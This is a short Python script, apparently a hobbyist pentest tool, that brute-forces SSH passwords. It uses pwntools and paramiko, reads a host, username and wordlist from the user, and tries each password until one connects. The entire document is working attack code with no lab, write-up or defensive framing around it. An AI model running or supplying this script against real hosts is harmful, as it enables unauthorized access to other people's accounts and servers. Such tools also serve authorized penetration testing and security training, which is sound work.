from pwn import *
import paramiko

host = input('Enter host IP address: ')
username = input("Enter username: ")
wordlist =input('Enter wordlist path: ')
attempts = 0

with open(wordlist, "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("\x1b[5;30;42m [Success] \x1b[0m Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
		    print("[X] Invalid password!")
		attempts += 1   
